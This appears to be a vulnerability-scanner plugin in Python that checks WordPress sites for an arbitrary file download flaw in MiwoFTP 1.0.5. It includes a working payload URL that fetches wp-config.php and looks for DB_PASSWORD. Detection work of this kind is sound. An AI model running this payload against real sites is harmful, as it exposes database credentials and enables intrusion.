#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#refer:http://www.1337day.com/exploit/23551
#refer:https://www.exploit-db.com/exploits/36801/

import sys
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = "/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes"
    verify_url = arg + payload
    code, head, res, _, _ = curl.curl(verify_url)
    if code == 200 and res.find('DB_PASSWORD') != -1:
        security_hole(verify_url + ': MiwoFTP 1.0.5 Arbitrary File Download')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
